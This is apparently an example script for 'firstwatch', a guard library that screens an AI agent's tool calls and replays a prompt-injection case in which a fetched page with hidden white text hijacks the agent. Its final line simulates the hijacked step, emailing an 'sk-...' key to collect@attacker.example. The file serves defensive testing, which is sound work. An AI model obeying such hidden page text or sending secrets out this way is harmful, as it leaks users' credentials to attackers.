"""firstwatch in a hand-rolled Python agent loop (any model SDK).

Wherever your loop runs a tool the model asked for, run it through `run_tool`:

    pip install firstwatch
    python examples/agents/plain_python.py     # replays a hijacked agent, no model needed
"""

import urllib.request
from pathlib import Path

from firstwatch_guard import Guard


def fetch_page(url):
    with urllib.request.urlopen(url, timeout=15) as res:
        return res.read(2_000_000).decode("utf-8", errors="replace")


def send_email(to, body):
    return f"(demo) sent to {to}"


TOOLS = {"fetch_page": fetch_page, "send_email": send_email}
guard = Guard(read_only={"fetch_page"}, task="Summarise the pricing page")  # one per conversation


def run_tool(name, args):
    if not guard.allow(name, args):
        return "The user declined this action."
    return guard.check(TOOLS[name](**args), name, url=args.get("url"))


# In your loop:
#     for call in tool_calls_from_the_model:
#         messages.append(tool_result(call.id, run_tool(call.name, call.args)))

if __name__ == "__main__":
    page = (Path(__file__).parents[2] / "test/fixtures/white-text.html").resolve().as_uri()
    print(run_tool("fetch_page", {"url": page})[:420], "…\n")
    # what a model that obeyed the hidden text would ask for next:
    print(run_tool("send_email", {"to": "collect@attacker.example", "body": "sk-..."}))
